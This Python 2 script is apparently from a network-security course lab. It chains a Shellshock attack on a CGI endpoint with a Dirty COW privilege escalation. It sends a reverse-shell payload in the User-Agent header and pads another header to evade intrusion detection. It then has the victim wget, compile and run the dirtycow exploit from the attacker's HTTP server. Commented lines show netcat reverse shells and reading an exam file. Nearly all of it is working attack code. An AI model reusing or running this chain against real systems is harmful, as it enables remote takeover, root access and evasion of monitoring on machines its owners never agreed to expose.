import requests
from collections import OrderedDict
import numpy as np
import socket
from threading import Thread
import SimpleHTTPServer
import SocketServer
import time


#dirtycow_url = "https://www.exploit-db.com/download/40616"
dirtycow_url = "http://10.2.136.121:8000/dirtycow.c"
own_ip = "10.2.136.121"
victim_ip = "10.2.142.226"
reverse_shell_port = 1234

def send_command(s, cmd):
	s.send(cmd+"\r")
	print "send(" + cmd + ")"

def create_http():
	PORT = 8000
	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	httpd = SocketServer.TCPServer(("", PORT), Handler)
	print "serving at port", PORT
	httpd.serve_forever()

def listen_for_shell():
	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", reverse_shell_port))
	s.listen(1)
	print "Listening on port "+str(reverse_shell_port)+"... "
	(client, (ip, port)) = s.accept()
	print client.recv(2048)
	print " Received connection from : ", ip
	print " Getting root with dirty cow"
	try:
		send_command(client, "cd /tmp")
		print client.recv(2048)
		send_command(client, "wget "+dirtycow_url+" --no-check-certificate")
		time.sleep(90)
		print client.recv(2048)
		print("compiling dirtycow")
		send_command(client, "gcc -pthread dirtycow.c -o c0w")
		print client.recv(2048)
		print("running dirtycow")
		send_command(client, "./c0w")
		print client.recv(2048)
		print("Checking if admin")
		send_command(client, "id")
		print client.recv(2048)
	finally:
		client.close()
		s.close()
	
 
t = Thread(target=listen_for_shell)
t2 = Thread(target=create_http)
t.start()
t2.start()
url = 'http://10.2.142.226/cgi-bin/index.cgi'
long_header = range(1,700)
np.random.shuffle(long_header)
long_header = map(str,long_header)
long_header = ''.join(long_header) # Long header to evade ids depth inspection
#print(long_header)
#shellcode =  '() { :; }; echo \"Content-Type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /home/netsec/course/exam.pdf'
#shellcode = '() { :; }; /bin/netcat -e /bin/bash '+own_ip+' '+str(reverse_shell_port)
shellcode = "() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ own_ip +"\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
print(shellcode)
s = requests.session()
s.headers = OrderedDict([('Accept-Language',long_header),('User-agent',shellcode)])
r = s.get(url)
print(r.text)
t.join()
t2.join()
